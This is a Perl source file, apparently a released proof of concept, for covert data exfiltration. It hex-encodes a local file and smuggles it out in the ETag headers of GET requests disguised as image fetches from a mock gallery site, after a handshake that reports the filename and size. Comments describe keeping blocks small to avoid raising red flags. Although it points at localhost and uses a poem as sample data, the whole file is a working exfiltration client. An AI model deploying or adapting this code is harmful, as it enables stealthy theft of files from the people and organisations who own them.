#!/usr/bin/perl

# Released under GPL 3.0

# Exfiltration POC with Mojolicious
# Inside script #1
# Codename Anna

# Hendrik Van Belleghem
# hendrik.vanbelleghem@gmail.com

# This script exfils a file into the HTTP header for a GET request to a mock gallery page
# Rudimentary handshake information is stored in call to 'index page'
# Data is stored in the 'image requests'

# Handshake data is sent is clear text (for now)
# Exfil data is encoded with (for now) a simple hex conversion

# Parameters used:
# b: number of blocks
# bs: block size
# h: header tag
# fn: filename
# fs: filesize
# f: format

# This script uses Mojolicious UserAgent (http://mojolicious.org)
# The outside server process obviously needs to know how to interpret the header data
# Packet content is ignored

use Mojo::UserAgent;

my $blocksize = 1024; # HTTP headers typically are limited. Not to raise red flags, keep this low
my $filename = "in.txt"; # Sample text: The Raven by Edgar Allen Poe
my $filesize = -s $filename;
$blocks = sprintf "%.0f", $filesize / $blocksize; # Round up
my $format = "h"; # HEX - May add some other ones later
if ($format eq "h") { $blocksize /= 2; } # Double char use for hex. Div by 2

my $indexpath = "localhost:8080/gallery/page/"; # Adjust per file?!?
my $imagepath = "localhost:8080/gallery/image/"; # Adjust per file?!?

my $ua = Mojo::UserAgent->new;
my $tx = $ua->get($indexpath."X" =>
{ etag => "b:$blocks;bs:$blocksize;h:etag;fn:$filename;fs:$filesize;f:$format"} # Generate handshake - cleartext
);
my $res = $tx->result; # Ignore - This is is a POC after all

open (INFILE, "<$filename") || die $!; 
my $data_raw;
my $i = 0;
if ($res->is_success) # At least we check for 200 for handshake
{ while ( read(INFILE,$data_raw,$blocksize) )
  { my $data = unpack "H*", $data_raw; # Convert to HEX
    my $tx = $ua->get("$imagepath$i.png" => # Send GET requests with hex'ed exfil data
    { etag => $data }
    );
    my $res = $tx->result;
    print $res->message;
    $i++;
  }
}